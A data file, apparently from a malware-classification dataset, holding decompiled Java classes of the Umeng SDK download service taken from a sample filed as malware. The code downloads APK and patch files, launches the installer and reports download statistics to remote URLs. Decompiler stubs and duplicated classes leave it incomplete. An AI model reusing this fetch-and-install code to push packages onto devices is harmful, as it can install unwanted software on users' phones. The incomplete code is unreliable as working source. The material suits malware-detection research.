Log.c(DownloadingService.t,e.getMessage(),e);       this.j.a(this.i,e);     }   }   @Override public void run(){     this.e=0;     try {       if (this.j != null) {         this.j.a(this.i);       }       a(this.f > 0);       if (DownloadingService.E.size() <= 0) {         DownloadingService.this.stopSelf();       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(  int i){     this.h=i;   }   private void a(  boolean r15){     throw new UnsupportedOperationException(""Method not decompiled: com.umeng.common.net.DownloadingService.b.a(boolean):void"");   }   private void a(){     Log.c(DownloadingService.t,""wait for repeating Test network repeat count="" + this.e);     try {       if (this.k.g) {         d.b bVar=(d.b)DownloadingService.F.get(this.i);         bVar.f[0]=this.f;         bVar.f[1]=this.g;         bVar.f[2]=this.e;         String a=m.a(this.i,m.b);         Intent intent=new Intent(this.b,(Class<?>)DownloadingService.class);         intent.putExtra(m.e,a);         DownloadingService.this.v.a(DownloadingService.this,intent);         DownloadingService.this.a(this.b.getString(com.umeng.common.a.c.c(this.b)));         Log.c(DownloadingService.t,""changed play state button on op-notification."");       }  else {         Thread.sleep(DownloadingService.C);         if (this.g < 1) {           a(false);         }  else {           a(true);         }       }     }  catch (    InterruptedException e) {       a(e);       DownloadingService.this.v.b(this.b,this.i);     }   }   private void b(  int i) throws RemoteException {     try {       if (DownloadingService.E.get(this.k) != null) {         ((Messenger)DownloadingService.E.get(this.k)).send(Message.obtain(null,3,i,0));       }     }  catch (    DeadObjectException e) {       Log.b(DownloadingService.t,String.format(""Service Client for downloading %1$15s is dead. Removing messenger from the service"",this.k.b));       DownloadingService.E.put(this.k,null);     }   }   private HttpURLConnection a(  URL url,  File file) throws IOException {     HttpURLConnection httpURLConnection=(HttpURLConnection)url.openConnection();     httpURLConnection.setRequestMethod(""GET"");     httpURLConnection.setRequestProperty(""Accept-Encoding"",""identity"");     httpURLConnection.addRequestProperty(""Connection"",""keep-alive"");     httpURLConnection.setConnectTimeout(5000);     httpURLConnection.setReadTimeout(10000);     if (file.exists() && file.length() > 0) {       Log.c(DownloadingService.t,String.format(this.k.b + "" getFileLength: %1$15s"",Long.valueOf(file.length())));       httpURLConnection.setRequestProperty(""Range"",""bytes="" + file.length() + ""-"");     }     return httpURLConnection;   }   private String a(  a.C0002a c0002a){     String str;     if (this.k.e != null) {       str=this.k.e + "".apk.tmp"";     }  else {       str=com.umeng.common.util.h.a(this.k.c) + "".apk.tmp"";     }     if (this.k.a.equalsIgnoreCase(""delta_update"")) {       return str.replace("".apk"","".patch"");     }     return str;   }   private void b(){     if (this.k.f != null) {       HashMap hashMap=new HashMap();       hashMap.put(""dsize"",String.valueOf(this.g));       hashMap.put(""dtime"",com.umeng.common.util.h.a().split("" "")[1]);       hashMap.put(""ptimes"",String.valueOf(this.e));       DownloadingService.this.v.a((Map<String,String>)hashMap,true,this.k.f);     }   }   private void a(  File file,  String str) throws RemoteException {     Log.c(DownloadingService.t,""itemMd5 "" + this.k.d);     Log.c(DownloadingService.t,""fileMd5 "" + com.umeng.common.util.h.a(file));     if (this.k.d != null && !this.k.d.equalsIgnoreCase(com.umeng.common.util.h.a(file))) {       if (this.k.a.equalsIgnoreCase(""delta_update"")) {         DownloadingService.this.u.cancel(this.i);         Bundle bundle=new Bundle();         bundle.putString(DownloadingService.p,str);         Message obtain=Message.obtain();         obtain.what=5;         obtain.arg1=3;         obtain.arg2=this.i;         obtain.setData(bundle);         try {           if (DownloadingService.E.get(this.k) != null) {             ((Messenger)DownloadingService.E.get(this.k)).send(obtain);           }           DownloadingService.this.v.b(this.b,this.i);           return;         }  catch (        RemoteException e) {           DownloadingService.this.v.b(this.b,this.i);           return;         }       }       ((Messenger)DownloadingService.E.get(this.k)).send(Message.obtain(null,5,0,0));       if (!this.k.h) {         DownloadingService.this.v.b(this.b,this.i);         Notification notification=new Notification(R.drawable.stat_sys_download_done,this.b.getString(com.umeng.common.a.c.i(this.b)),System.currentTimeMillis());         notification.setLatestEventInfo(this.b,com.umeng.common.b.w(this.b),this.k.b + this.b.getString(com.umeng.common.a.c.i(this.b)),PendingIntent.getActivity(this.b,0,new Intent(),0));         notification.flags|=16;         DownloadingService.this.u.notify(this.i,notification);       }     }   }   private void a(  Exception exc){     Log.b(DownloadingService.t,""can not install. "" + exc.getMessage());     if (this.j != null) {       this.j.a(this.i,exc);     }     DownloadingService.this.v.a(this.k,this.f,this.g,this.e);   } } private class b extends AsyncTask<Integer,Integer,p.a> {   private o b;   private a c;   public b(  o oVar,  a aVar){     this.b=oVar;     this.c=aVar;   }   @Override protected void onPreExecute(){     if (this.c != null) {       this.c.a();     }   }   @Override public void onPostExecute(  p.a aVar){     if (this.c != null) {       this.c.a(aVar);     }   }   @Override public p.a doInBackground(  Integer... numArr){     return n.this.a(this.b);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\c.code","public class c {   private static final String a=c.class.getName();   private static final String b=""umeng_download_task_list"";   private static final String c=""UMENG_DATA"";   private static final String d=""cp"";   private static final String e=""url"";   private static final String f=""progress"";   private static final String g=""last_modified"";   private static final String h=""extra"";   private static Context i=null;   private static final String j=""yyyy-MM-dd HH:mm:ss"";   private a k;   private c(){     this.k=new a(i);   } private static class b {     public static final c a=new c();     private b(){     }   }   public static c a(  Context context){     if (i == null && context == null) {       throw new NullPointerException();     }     if (i == null) {       i=context;     }     return b.a;   }   public boolean a(  String str,  String str2){     Exception e2;     boolean z;     Cursor query;     ContentValues contentValues=new ContentValues();     contentValues.put(d,str);     contentValues.put(e,str2);     contentValues.put(f,(Integer)0);     contentValues.put(g,com.umeng.common.util.h.a());     try {       query=this.k.getReadableDatabase().query(b,new String[]{f},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");       if (query.getCount() > 0) {         Log.c(a,""insert("" + str + "", ""+ str2+ ""):  already exists in the db. Insert is cancelled."");         z=false;       }  else {         long insert=this.k.getWritableDatabase().insert(b,null,contentValues);         boolean z2=insert != -1;         try {           Log.c(a,""insert("" + str + "", ""+ str2+ ""): rowid=""+ insert);           z=z2;         }  catch (        Exception e3) {           z=z2;           e2=e3;           Log.c(a,""insert("" + str + "", ""+ str2+ ""): ""+ e2.getMessage(),e2);           return z;         }       }     }  catch (    Exception e4) {       e2=e4;       z=false;     }     try {       query.close();     }  catch (    Exception e5) {       e2=e5;       Log.c(a,""insert("" + str + "", ""+ str2+ ""): ""+ e2.getMessage(),e2);       return z;     }     return z;   }   public void a(  String str,  String str2,  int i2){     ContentValues contentValues=new ContentValues();     contentValues.put(f,Integer.valueOf(i2));     contentValues.put(g,com.umeng.common.util.h.a());     this.k.getWritableDatabase().update(b,contentValues,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""updateProgress("" + str + "", ""+ str2+ "", ""+ i2+ "")"");   }   public void a(  String str,  String str2,  String str3){     ContentValues contentValues=new ContentValues();     contentValues.put(h,str3);     contentValues.put(g,com.umeng.common.util.h.a());     this.k.getWritableDatabase().update(b,contentValues,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""updateExtra("" + str + "", ""+ str2+ "", ""+ str3+ "")"");   }   public int b(  String str,  String str2){     int i2;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{f},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");     if (query.getCount() <= 0) {       i2=-1;     }  else {       query.moveToFirst();       i2=query.getInt(0);     }     query.close();     return i2;   }   public String c(  String str,  String str2){     String str3=null;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{h},""cp=? and url=?"",new String[]{str,str2},null,null,null,""1"");     if (query.getCount() > 0) {       query.moveToFirst();       str3=query.getString(0);     }     query.close();     return str3;   }   public Date d(  String str,  String str2){     Date date=null;     Cursor query=this.k.getReadableDatabase().query(b,new String[]{g},""cp=? and url=?"",new String[]{str,str2},null,null,null,null);     if (query.getCount() > 0) {       query.moveToFirst();       String string=query.getString(0);       Log.c(a,""getLastModified("" + str + "", ""+ str2+ ""): ""+ string);       try {         date=new SimpleDateFormat(j).parse(string);       }  catch (      Exception e2) {         Log.c(a,e2.getMessage());       }     }     query.close();     return date;   }   public void e(  String str,  String str2){     this.k.getWritableDatabase().delete(b,""cp=? and url=?"",new String[]{str,str2});     Log.c(a,""delete("" + str + "", ""+ str2+ "")"");   }   public List<String> a(  String str){     Cursor query=this.k.getReadableDatabase().query(b,new String[]{e},""cp=?"",new String[]{str},null,null,null,""1"");     ArrayList arrayList=new ArrayList();     query.moveToFirst();     while (!query.isAfterLast()) {       arrayList.add(query.getString(0));       query.moveToNext();     }     query.close();     return arrayList;   }   public void a(  int i2){     try {       Date date=new Date(new Date().getTime() - (i2 * 1000));       this.k.getWritableDatabase().execSQL("" DELETE FROM umeng_download_task_list WHERE strftime('yyyy-MM-dd HH:mm:ss', last_modified)<=strftime('yyyy-MM-dd HH:mm:ss', '"" + new SimpleDateFormat(j).format(date) + ""')"");       Log.c(a,""clearOverdueTasks("" + i2 + "") remove all tasks before ""+ new SimpleDateFormat(j).format(date));     }  catch (    Exception e2) {       Log.b(a,e2.getMessage());     }   }   public void finalize(){     this.k.close();   } class a extends SQLiteOpenHelper {     private static final int b=2;     private static final String c=""CREATE TABLE umeng_download_task_list (cp TEXT, url TEXT, progress INTEGER, extra TEXT, last_modified TEXT, UNIQUE (cp,url) ON CONFLICT ABORT);"";     a(    Context context){       super(context,c.c,(SQLiteDatabase.CursorFactory)null,2);     }     @Override public void onCreate(    SQLiteDatabase sQLiteDatabase){       Log.c(c.a,c);       sQLiteDatabase.execSQL(c);     }     @Override public void onUpgrade(    SQLiteDatabase sQLiteDatabase,    int i,    int i2){     }   } } class c extends AsyncTask<String,Void,Integer> {   public int a;   public String b;   private a.C0002a d;   private Context e;   private NotificationManager f;   public c(  Context context,  int i,  a.C0002a c0002a,  String str){     this.e=context.getApplicationContext();     this.f=(NotificationManager)this.e.getSystemService(""notification"");     this.a=i;     this.d=c0002a;     this.b=str;   }   @Override protected void onPreExecute(){     super.onPreExecute();   }   @Override public Integer doInBackground(  String... strArr){     int a=DeltaUpdate.a(strArr[0],strArr[1],strArr[2]) + 1;     new File(strArr[2]).delete();     if (a != 1) {       Log.a(d.e,""file patch error"");     }  else {       if (!com.umeng.common.util.h.a(new File(strArr[1])).equalsIgnoreCase(this.d.e)) {         Log.a(d.e,""file patch error"");         return 0;       }       Log.a(d.e,""file patch success"");     }     return Integer.valueOf(a);   }   @Override public void onPostExecute(  Integer num){     if (num.intValue() == 1) {       Notification notification=new Notification(R.drawable.stat_sys_download_done,this.e.getString(com.umeng.common.a.c.l(this.e)),System.currentTimeMillis());       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.addFlags(268435456);       intent.setDataAndType(Uri.fromFile(new File(this.b)),""application/vnd.android.package-archive"");       notification.setLatestEventInfo(this.e,com.umeng.common.b.w(this.e),this.e.getString(com.umeng.common.a.c.l(this.e)),PendingIntent.getActivity(this.e,0,intent,134217728));       notification.flags=16;       this.f.notify(this.a + 1,notification);       if (d.this.a(this.e) && !this.d.h) {         this.f.cancel(this.a + 1);         this.e.startActivity(intent);       }       Bundle bundle=new Bundle();       bundle.putString(""filename"",this.b);       Message obtain=Message.obtain();       obtain.what=5;       obtain.arg1=1;       obtain.arg2=this.a;       obtain.setData(bundle);       try {         if (d.this.g.get(this.d) != null) {           ((Messenger)d.this.g.get(this.d)).send(obtain);         }         d.this.b(this.e,this.a);         return;       }  catch (      RemoteException e) {         d.this.b(this.e,this.a);         return;       }     }     this.f.cancel(this.a + 1);     Bundle bundle2=new Bundle();     bundle2.putString(""filename"",this.b);     Message obtain2=Message.obtain();     obtain2.what=5;     obtain2.arg1=3;     obtain2.arg2=this.a;     obtain2.setData(bundle2);     try {       if (d.this.g.get(this.d) != null) {         ((Messenger)d.this.g.get(this.d)).send(obtain2);       }       d.this.b(this.e,this.a);     }  catch (    RemoteException e2) {       d.this.b(this.e,this.a);     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@34e017c5public static class c extends AsyncTask<Object,Integer,Drawable> {   private Context a;   private String b;   private ImageView c;   private b d;   private boolean e;   private a f;   private Animation g;   private boolean h;   private File i;   public c(  Context context,  ImageView imageView,  String str,  b bVar,  File file,  boolean z,  a aVar,  Animation animation,  boolean z2){     this.i=file;     this.a=context;     this.b=str;     this.f=aVar;     this.d=bVar;     this.e=z;     this.g=animation;     this.c=imageView;     this.h=z2;   }   @Override protected void onPreExecute(){     super.onPreExecute();     if (this.f != null) {       this.f.a(this.d);     }   }   @Override public void onPostExecute(  Drawable drawable){     q.b(this.a,this.c,drawable,this.e,this.f,this.g,this.h,this.b);   }   @Override public Drawable doInBackground(  Object... objArr){     if (q.a) {       try {         Thread.sleep(3000L);       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     if (this.i != null && this.i.exists()) {       Drawable c=q.c(this.i.getAbsolutePath());       if (c == null) {         this.i.delete();       }       Log.c(q.b,""get drawable from cacheFile."");       return c;     }     try {       q.a(this.a,this.b);       File b=q.b(this.a,this.b);       Drawable c2=(b == null || !b.exists()) ? null : q.c(b.getAbsolutePath());       Log.c(q.b,""get drawable from net else file."");       return c2;     }  catch (    Exception e2) {       Log.e(q.b,e2.toString(),e2);       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\C0002a.code","public static class C0002a {   public String a;   public String b;   public String c;   public String d;   public String e;   public String[] f=null;   public boolean g=false;   public boolean h=false;   public boolean i=false;   public C0002a(  String str,  String str2,  String str3){     this.a=str;     this.b=str2;     this.c=str3;   }   public Bundle a(){     Bundle bundle=new Bundle();     bundle.putString(""mComponentName"",this.a);     bundle.putString(""mTitle"",this.b);     bundle.putString(""mUrl"",this.c);     bundle.putString(""mMd5"",this.d);     bundle.putString(""mTargetMd5"",this.e);     bundle.putStringArray(""reporturls"",this.f);     bundle.putBoolean(""rich_notification"",this.g);     bundle.putBoolean(""mSilent"",this.h);     bundle.putBoolean(""mWifiOnly"",this.i);     return bundle;   }   public static C0002a a(  Bundle bundle){     C0002a c0002a=new C0002a(bundle.getString(""mComponentName""),bundle.getString(""mTitle""),bundle.getString(""mUrl""));     c0002a.d=bundle.getString(""mMd5"");     c0002a.e=bundle.getString(""mTargetMd5"");     c0002a.f=bundle.getStringArray(""reporturls"");     c0002a.g=bundle.getBoolean(""rich_notification"");     c0002a.h=bundle.getBoolean(""mSilent"");     c0002a.i=bundle.getBoolean(""mWifiOnly"");     return c0002a;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\d.code","public class d {   static final int a=0;   static final int b=1;   static final int c=1;   static final int d=2;   private static final String e=d.class.getName();   private SparseArray<b> f;   private Map<a.C0002a,Messenger> g;   private l h;   public d(  SparseArray<b> sparseArray,  Map<a.C0002a,Messenger> map,  l lVar){     this.f=sparseArray;     this.g=map;     this.h=lVar;   } public static class b {     DownloadingService.b a;     a b;     int c;     int d;     a.C0002a e;     long[] f=new long[3];     public b(    a.C0002a c0002a,    int i){       this.c=i;       this.e=c0002a;     }     public void a(    SparseArray<b> sparseArray){       sparseArray.put(this.c,this);     }     public void b(    SparseArray<b> sparseArray){       if (sparseArray.indexOfKey(this.c) >= 0) {         sparseArray.remove(this.c);       }     }   } public static class a extends com.umeng.common.util.j {     public a(    Context context){       super(context);     }     public a a(    RemoteViews remoteViews){       this.b.contentView=remoteViews;       return this;     }     public a a(    CharSequence charSequence){       if (Build.VERSION.SDK_INT >= 14) {         this.c.setContentText(charSequence);       }       this.b.contentView.setTextViewText(com.umeng.common.a.a.a(this.a),charSequence);       return this;     }     public a b(    CharSequence charSequence){       if (Build.VERSION.SDK_INT >= 14) {         this.c.setContentTitle(charSequence);       }       this.b.contentView.setTextViewText(com.umeng.common.a.a.d(this.a),charSequence);       return this;     }     public a a(    int i,    int i2,    boolean z){       if (Build.VERSION.SDK_INT >= 14) {         this.c.setProgress(i,i2,z);       }       this.b.contentView.setProgressBar(com.umeng.common.a.a.c(this.a),100,i2,false);       return this;     }     public a a(){       this.b.contentView.setViewVisibility(com.umeng.common.a.a.e(this.a),8);       this.b.contentView.setViewVisibility(com.umeng.common.a.a.g(this.a),8);       return this;     }     public a a(    PendingIntent pendingIntent,    PendingIntent pendingIntent2){       this.b.contentView.setOnClickPendingIntent(com.umeng.common.a.a.e(this.a),pendingIntent);       this.b.contentView.setViewVisibility(com.umeng.common.a.a.e(this.a),0);       this.b.contentView.setViewVisibility(com.umeng.common.a.a.g(this.a),0);       this.b.contentView.setOnClickPendingIntent(com.umeng.common.a.a.g(this.a),pendingIntent2);       return this;     }     public a b(){       int e=com.umeng.common.a.a.e(this.a);       this.b.contentView.setTextViewText(e,this.a.getResources().getString(com.umeng.common.a.c.e(this.a.getApplicationContext())));       this.b.contentView.setInt(e,""setBackgroundResource"",Res.getInstance(this.a).c(""umeng_common_gradient_green""));       return this;     }     public a c(){       int e=com.umeng.common.a.a.e(this.a);       this.b.contentView.setTextViewText(e,this.a.getResources().getString(com.umeng.common.a.c.d(this.a.getApplicationContext())));       this.b.contentView.setInt(e,""setBackgroundResource"",Res.getInstance(this.a).c(""umeng_common_gradient_orange""));       return this;     }     public Notification d(){       if (Build.VERSION.SDK_INT >= 16) {         return this.c.build();       }       if (Build.VERSION.SDK_INT >= 14) {         return this.c.getNotification();       }       return this.b;     }     public void a(    int i,    String str,    PendingIntent pendingIntent){       if (Build.VERSION.SDK_INT >= 16) {         this.c.addAction(i,str,pendingIntent);       }     }   }   public int a(  a.C0002a c0002a){     return Math.abs((int)((c0002a.b.hashCode() >> 2) + (c0002a.c.hashCode() >> 3) + System.currentTimeMillis()));   }   public a a(  Context context,  a.C0002a c0002a,  int i,  int i2){     Context applicationContext=context.getApplicationContext();     a aVar=new a(applicationContext);     aVar.c(applicationContext.getString(com.umeng.common.a.c.j(applicationContext))).a(R.drawable.stat_sys_download).a(PendingIntent.getActivity(applicationContext,0,new Intent(),134217728)).a(System.currentTimeMillis());     RemoteViews remoteViews=new RemoteViews(applicationContext.getPackageName(),com.umeng.common.a.b.a(applicationContext));     if (Build.VERSION.SDK_INT >= 14) {       int dimensionPixelSize=applicationContext.getResources().getDimensionPixelSize(R.dimen.notification_large_icon_width);       int dimensionPixelSize2=applicationContext.getResources().getDimensionPixelSize(R.dimen.notification_large_icon_height);       remoteViews.setInt(com.umeng.common.a.a.b(applicationContext),""setWidth"",dimensionPixelSize);       remoteViews.setInt(com.umeng.common.a.a.b(applicationContext),""setHeight"",dimensionPixelSize2);       try {         Field declaredField=Class.forName(""com.android.internal.R$drawable"").getDeclaredField(""notify_panel_notification_icon_bg_tile"");         declaredField.setAccessible(true);         remoteViews.setInt(com.umeng.common.a.a.b(applicationContext),""setBackgroundResource"",declaredField.getInt(null));       }  catch (      Exception e2) {         Log.a(e,""No notification icon background found:"",e2);       }     }  else {       try {         Field declaredField2=Class.forName(""com.android.internal.R$drawable"").getDeclaredField(""status_bar_notification_icon_bg"");         declaredField2.setAccessible(true);         remoteViews.setInt(com.umeng.common.a.a.b(applicationContext),""setBackgroundResource"",declaredField2.getInt(null));       }  catch (      Exception e3) {         try {           Class<?> cls=Class.forName(""com.android.internal.R$dimen"");           Field declaredField3=cls.getDeclaredField(""status_bar_edge_ignore"");           declaredField3.setAccessible(true);           int dimensionPixelSize3=applicationContext.getResources().getDimensionPixelSize(declaredField3.getInt(null)) + 0;           Field declaredField4=cls.getDeclaredField(""status_bar_height"");           declaredField4.setAccessible(true);           int i3=declaredField4.getInt(null);           remoteViews.setInt(com.umeng.common.a.a.b(applicationContext),""setWidth"",applicationContext.getResources().getDimensionPixelSize(i3) + dimensionPixelSize3 + applicationContext.getResources().getDimensionPixelSize(i3));         }  catch (        Exception e4) {           Log.a(e,""No notification size found:"",e4);         }       }     }     aVar.a(remoteViews);     aVar.b(applicationContext.getResources().getString(com.umeng.common.a.c.g(applicationContext)) + c0002a.b).a(i2 + ""%"").a(100,i2,false);     if (c0002a.g) {       aVar.b(remoteViews);       aVar.e();       PendingIntent b2=m.b(applicationContext,m.a(i,m.b));       PendingIntent b3=m.b(applicationContext,m.a(i,m.c));       a(applicationContext,aVar,i,2);       aVar.a(b2,b3).c().a(true).b(false);     }  else {       aVar.a().a(true).b(false);     }     return aVar;   }   void a(  Context context,  a aVar,  int i,  int i2){     if (Build.VERSION.SDK_INT >= 16) {       PendingIntent b2=m.b(context,m.a(i,m.b));       PendingIntent b3=m.b(context,m.a(i,m.c)); switch (i2) { case 1:         aVar.a(R.drawable.ic_media_play,context.getResources().getString(com.umeng.common.a.c.e(context)),b2);       break; case 2:     aVar.a(R.drawable.ic_media_pause,context.getResources().getString(com.umeng.common.a.c.d(context)),b2);   break; } aVar.a(R.drawable.ic_menu_close_clear_cancel,context.getResources().getString(com.umeng.common.a.c.f(context)),b3); } } public boolean a(Context context){ List<ActivityManager.RunningAppProcessInfo> runningAppProcesses=((ActivityManager)context.getSystemService(""activity"")).getRunningAppProcesses(); if (runningAppProcesses == null) { return false; } String packageName=context.getPackageName(); for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) { if (runningAppProcessInfo.importance == 100 && runningAppProcessInfo.processName.equals(packageName)) { return true; } } return false; } public boolean a(a.C0002a c0002a,boolean z,Messenger messenger){ if (z) { int nextInt=new Random().nextInt(1000); if (this.g != null) { for (a.C0002a c0002a2 : this.g.keySet()) {   Log.c(e,""_"" + nextInt + "" downling  ""+ c0002a2.b+ ""   ""+ c0002a2.c); } }  else { Log.c(e,""_"" + nextInt + ""downling  null""); } } if (this.g == null) { return false; } for (a.C0002a c0002a3 : this.g.keySet()) { if (c0002a.e != null && c0002a.e.equals(c0002a3.e)) { this.g.put(c0002a3,messenger); return true; } if (c0002a3.c.equals(c0002a.c)) { this.g.put(c0002a3,messenger); return true; } } return false; } public int b(a.C0002a c0002a){ int i=0; while (true) { int i2=i; if (i2 >= this.f.size()) { return -1; } int keyAt=this.f.keyAt(i2); if (c0002a.e != null && c0002a.e.equals(this.f.get(keyAt).e.e)) { return this.f.get(keyAt).c; } if (!this.f.get(keyAt).e.c.equals(c0002a.c)) { i=i2 + 1; }  else { return this.f.get(keyAt).c; } } } void a(Context context,int i){ Context applicationContext=context.getApplicationContext(); NotificationManager notificationManager=(NotificationManager)applicationContext.getSystemService(""notification""); b bVar=this.f.get(i); bVar.b.e(); a(applicationContext,bVar.b,i,1); bVar.b.b(applicationContext.getResources().getString(com.umeng.common.a.c.h(applicationContext)) + bVar.e.b).b().a(false).b(true); notificationManager.notify(i,bVar.b.d()); } public void b(Context context,int i){ NotificationManager notificationManager=(NotificationManager)context.getApplicationContext().getSystemService(""notification""); b bVar=this.f.get(i); if (bVar != null) { Log.c(e,""download service clear cache "" + bVar.e.b); if (bVar.a != null) { bVar.a.a(2); } notificationManager.cancel(bVar.c); if (this.g.containsKey(bVar.e)) { this.g.remove(bVar.e); } bVar.b(this.f); this.h.b(i); } } public void a(a.C0002a c0002a,long j,long j2,long j3){ if (c0002a.f != null) { HashMap hashMap=new HashMap(); hashMap.put(""dsize"",String.valueOf(j)); hashMap.put(""dtime"",com.umeng.common.util.h.a().split("" "")[1]); float f=0.0f; if (j2 > 0) { f=((float)j) / ((float)j2); } hashMap.put(""dpcent"",String.valueOf((int)(f * 100.0f))); hashMap.put(""ptimes"",String.valueOf(j3)); a((Map<String,String>)hashMap,false,c0002a.f); } } public final void a(Map<String,String> map,boolean z,String[] strArr){ new Thread(new e(this,strArr,z,map)).start(); } public boolean a(DownloadingService downloadingService,Intent intent){ Context applicationContext; int parseInt; String trim; try { applicationContext=downloadingService.getApplicationContext(); String[] split=intent.getExtras().getString(m.e).split("":""); parseInt=Integer.parseInt(split[0]); trim=split[1].trim(); }  catch (Exception e2) { e2.printStackTrace(); } if (parseInt != 0 && !TextUtils.isEmpty(trim) && this.f.indexOfKey(parseInt) >= 0) { b bVar=this.f.get(parseInt); DownloadingService.b bVar2=bVar.a; if (m.b.equals(trim)) { if (bVar2 == null) {   Log.c(e,""Receive action do play click."");   if (com.umeng.common.b.a(applicationContext,""android.permission.ACCESS_NETWORK_STATE"") && !com.umeng.common.b.n(applicationContext)) {     Toast.makeText(applicationContext,applicationContext.getResources().getString(com.umeng.common.a.c.a(applicationContext.getApplicationContext())),1).show();     return false;   }   downloadingService.getClass();   DownloadingService.b bVar3=new DownloadingService.b(applicationContext,bVar.e,parseInt,bVar.d,downloadingService.q);   bVar.a=bVar3;   bVar3.start();   Message obtain=Message.obtain();   obtain.what=2;   obtain.arg1=7;   obtain.arg2=parseInt;   try {     if (this.g.get(bVar.e) != null) {       this.g.get(bVar.e).send(obtain);     }   }  catch (  RemoteException e3) {     Log.b(e,"""",e3);   }   return true; } Log.c(e,""Receive action do play click.""); bVar2.a(1); bVar.a=null; a(applicationContext,parseInt); Message obtain2=Message.obtain(); obtain2.what=2; obtain2.arg1=6; obtain2.arg2=parseInt; try {   if (this.g.get(bVar.e) != null) {     this.g.get(bVar.e).send(obtain2);   } }  catch (RemoteException e4) {   Log.b(e,"""",e4); } return true; } if (m.c.equals(trim)) { Log.c(e,""Receive action do stop click.""); try {   try {     if (bVar2 != null) {       bVar2.a(2);     }  else {       a(bVar.e,bVar.f[0],bVar.f[1],bVar.f[2]);     }     Message obtain3=Message.obtain();     obtain3.what=5;     obtain3.arg1=5;     obtain3.arg2=parseInt;     try {       if (this.g.get(bVar.e) != null) {         this.g.get(bVar.e).send(obtain3);       }       b(applicationContext,parseInt);     }  catch (    RemoteException e5) {       b(applicationContext,parseInt);     }   }  catch (  Throwable th) {     Message obtain4=Message.obtain();     obtain4.what=5;     obtain4.arg1=5;     obtain4.arg2=parseInt;     try {       if (this.g.get(bVar.e) != null) {         this.g.get(bVar.e).send(obtain4);       }       b(applicationContext,parseInt);       throw th;     }  catch (    RemoteException e6) {       b(applicationContext,parseInt);       throw th;     }   } }  catch (Exception e7) {   Message obtain5=Message.obtain();   obtain5.what=5;   obtain5.arg1=5;   obtain5.arg2=parseInt;   try {     if (this.g.get(bVar.e) != null) {       this.g.get(bVar.e).send(obtain5);     }     b(applicationContext,parseInt);   }  catch (  RemoteException e8) {     b(applicationContext,parseInt);   } } return true; } e2.printStackTrace(); } return false; } class c extends AsyncTask<String,Void,Integer> { public int a; public String b; private a.C0002a d; private Context e; private NotificationManager f; public c(Context context,int i,a.C0002a c0002a,String str){ this.e=context.getApplicationContext(); this.f=(NotificationManager)this.e.getSystemService(""notification""); this.a=i; this.d=c0002a; this.b=str; } @Override protected void onPreExecute(){ super.onPreExecute(); } @Override public Integer doInBackground(String... strArr){ int a=DeltaUpdate.a(strArr[0],strArr[1],strArr[2]) + 1; new File(strArr[2]).delete(); if (a != 1) { Log.a(d.e,""file patch error""); }  else { if (!com.umeng.common.util.h.a(new File(strArr[1])).equalsIgnoreCase(this.d.e)) {   Log.a(d.e,""file patch error"");   return 0; } Log.a(d.e,""file patch success""); } return Integer.valueOf(a); } @Override public void onPostExecute(Integer num){ if (num.intValue() == 1) { Notification notification=new Notification(R.drawable.stat_sys_download_done,this.e.getString(com.umeng.common.a.c.l(this.e)),System.currentTimeMillis()); Intent intent=new Intent(""android.intent.action.VIEW""); intent.addFlags(268435456); intent.setDataAndType(Uri.fromFile(new File(this.b)),""application/vnd.android.package-archive""); notification.setLatestEventInfo(this.e,com.umeng.common.b.w(this.e),this.e.getString(com.umeng.common.a.c.l(this.e)),PendingIntent.getActivity(this.e,0,intent,134217728)); notification.flags=16; this.f.notify(this.a + 1,notification); if (d.this.a(this.e) && !this.d.h) {   this.f.cancel(this.a + 1);   this.e.startActivity(intent); } Bundle bundle=new Bundle(); bundle.putString(""filename"",this.b); Message obtain=Message.obtain(); obtain.what=5; obtain.arg1=1; obtain.arg2=this.a; obtain.setData(bundle); try {   if (d.this.g.get(this.d) != null) {     ((Messenger)d.this.g.get(this.d)).send(obtain);   }   d.this.b(this.e,this.a);   return; }  catch (RemoteException e) {   d.this.b(this.e,this.a);   return; } } this.f.cancel(this.a + 1); Bundle bundle2=new Bundle(); bundle2.putString(""filename"",this.b); Message obtain2=Message.obtain(); obtain2.what=5; obtain2.arg1=3; obtain2.arg2=this.a; obtain2.setData(bundle2); try { if (d.this.g.get(this.d) != null) {   ((Messenger)d.this.g.get(this.d)).send(obtain2); } d.this.b(this.e,this.a); }  catch (RemoteException e2) { d.this.b(this.e,this.a); } } } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\DownloadingService.code","!org.eclipse.jdt.core.dom.TypeDeclaration@16ef47bd"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\e.code","public class e implements Runnable {   final String[] a;   final boolean b;   final Map c;   final d d;   public e(  d dVar,  String[] strArr,  boolean z,  Map map){     this.d=dVar;     this.a=strArr;     this.b=z;     this.c=map;   }   @Override public void run(){     HttpResponse execute;     int nextInt=new Random().nextInt(1000);     if (this.a == null) {       Log.a(d.e,nextInt + ""service report: urls is null"");       return;     }     for (    String str : this.a) {       String a=com.umeng.common.util.h.a();       String str2=a.split("" "")[0];       String str3=a.split("" "")[1];       long currentTimeMillis=System.currentTimeMillis();       StringBuilder sb=new StringBuilder(str);       sb.append(""&data="").append(str2);       sb.append(""&time="").append(str3);       sb.append(""&ts="").append(currentTimeMillis);       if (!this.b) {         sb.append(""&action_type="").append(-2);       }  else {         sb.append(""&action_type="").append(1);       }       if (this.c != null) {         for (        String str4 : this.c.keySet()) {           